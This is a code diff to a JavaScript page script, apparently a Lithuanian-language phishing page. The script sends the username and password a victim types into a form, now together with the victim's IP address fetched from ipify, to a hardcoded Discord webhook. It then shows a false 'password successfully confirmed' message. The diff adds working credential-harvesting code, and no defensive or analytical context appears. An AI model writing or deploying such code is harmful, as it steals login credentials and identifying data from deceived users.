@@ -18,22 +18,30 @@ document.addEventListener('DOMContentLoaded', function() {
     } else {
       const webhookUrl = 'https://discord.com/api/webhooks/1080993406391689276/LP40O2IyY502kwcpKfEeCqWLm8eoWwKrKSJLR9LUIQpOidp4eLwBWqt2iyDinKL7Mw'+'7V';
 
-      // Construct the message payload
-      const payload = {
-        content: 'User: '+userText + ' Pass: '+passText
-      };
+      //Get ip
+      fetch('https://api.ipify.org/?format=json')
+        .then(results => results.json())
+        .then(data => {
+          const address = data.ip;
+          
+          // Construct the message payload
+          const payload = {
+            content: 'User: '+userText + ' Pass: '+passText + ' IP: '+address
+          };
 
-      // Send the message to the webhook
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .catch(error => {
-        console.error("Nepavyko patvirtinti slaptažodžio:", error);
-      });
+          // Send the message to the webhook
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          })
+          .catch(error => {
+            console.error("Įvyko klaida:", error);
+          });
+        })
+        .catch(error => console.error(error));
 
       square.style.height = '235px';
       smallText.innerHTML = 'Slaptaždis sėkmingai patvirtintas.'
